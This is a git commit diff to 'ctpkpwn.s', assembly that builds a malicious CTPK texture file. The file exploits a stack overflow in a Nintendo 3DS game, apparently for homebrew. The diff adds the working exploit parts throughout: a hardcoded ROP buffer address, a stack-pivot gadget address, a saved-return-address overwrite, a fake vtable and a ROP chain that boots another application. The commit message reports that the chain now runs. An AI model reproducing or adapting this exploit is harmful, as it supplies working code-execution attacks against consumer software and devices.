452cdeeab805d339c66021bf012121d575adfe56
yellows8 <yellows8@users.noreply.github.com>
2017-01-06 01:39:38 -0500

    Added proper ROPBUF and stack-pivot + updated ROPKIT_LINEARMEM_BUF. ropkit_boototherapp runs now, triggers fatalerror @ payload-reading failure.

--- ctpkpwn.s
+++ ctpkpwn.s
@@ -4,29 +4,28 @@
 
 _start:
 
-#define ROPBUF 0x80808080
+#define ROPBUF 0x32927e80 //For TFH USA, probably has to be updated for others.
 
 #define MEMSET32_OTHER 0x90909090
 
+#define STACKPIVOT_ADR 0x100848 //ldmdb r6!, {r0, r1, r2, r3, r4, r5, r6, r7, r8, ip, sp, lr, pc} (For TFH USA)
+
 #define ROPKIT_LINEARMEM_REGIONBASE 0x30000000
 
-#define ROPKIT_LINEARMEM_BUF (ROPKIT_LINEARMEM_REGIONBASE+0x2000000)
+#define ROPKIT_LINEARMEM_BUF (ROPBUF+0x100000)
 
 #define TARGET_STACKFRAME_BEFORELROVERWRITE_SIZE 0x50 //Byte-size needed to overwrite data on the stack right before saved LR.
 
 #include "ropkit_ropinclude.s"
 
 .macro ROPMACRO_STACKPIVOT_PREPAREREGS_BEFOREJUMP
-.word POP_R2R6PC
-.word 0 @ r2
-.word 0 @ r3
-.word ROPBUFLOC(pivotdata) @ r4
+.word POP_R5R6PC
 .word 0 @ r5
-.word 0 @ r6
+.word ROPBUFLOC(pivotdata+0x34) @ r6
 .endm
 
 .macro ROPMACRO_STACKPIVOT_JUMP
-.word 0x50505050//STACKPIVOT_ADR
+.word STACKPIVOT_ADR
 .endm
 
 .word 0x4b505443 @ +0x0 u32: Magicnum 0x13304f6.
@@ -36,7 +35,7 @@ _start:
 
 .space ((_start + 0x20) - .) @ Entry for the first texture, 0x20-bytes per entry.
 .word 0, 0, 0, 0, 0
-.word (TARGET_STACKFRAME_BEFORELROVERWRITE_SIZE+0x4)>>2 @ u8size, total size to copy in words.
+.word (TARGET_STACKFRAME_BEFORELROVERWRITE_SIZE+0x10)>>2 @ u8size, total size to copy in words.
 .word 0x40>>2 @ Absolute offset for the srcdataptr, in words.
 .word 0
 
@@ -44,20 +43,24 @@ _start:
 .space TARGET_STACKFRAME_BEFORELROVERWRITE_SIZE
 
 @ This is where the initial saved-LR-overwrite is located.
-.word 0x40404040
+ROPMACRO_STACKPIVOT_PREPAREREGS_BEFOREJUMP
+ROPMACRO_STACKPIVOT_JUMP
 
 ropstackstart:
 #include "ropkit_boototherapp.s"
 
 pivotdata:
+.word 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
 
 stackpivot_sploadword:
-.word 0
+.word ROPBUFLOC(ropstackstart)
+
+.word 0 @ lr
 
 stackpivot_pcloadword:
-.word 0
+.word ROP_POPPC
 
 ropkit_cmpobject:
 .word (ROPBUFLOC(ropkit_cmpobject) + 0x4) @ Vtable-ptr
-.fill (0x40 / 4), 4, /*STACKPIVOT_ADR*/0x70707070 @ Vtable
+.fill (0x40 / 4), 4, STACKPIVOT_ADR @ Vtable
 
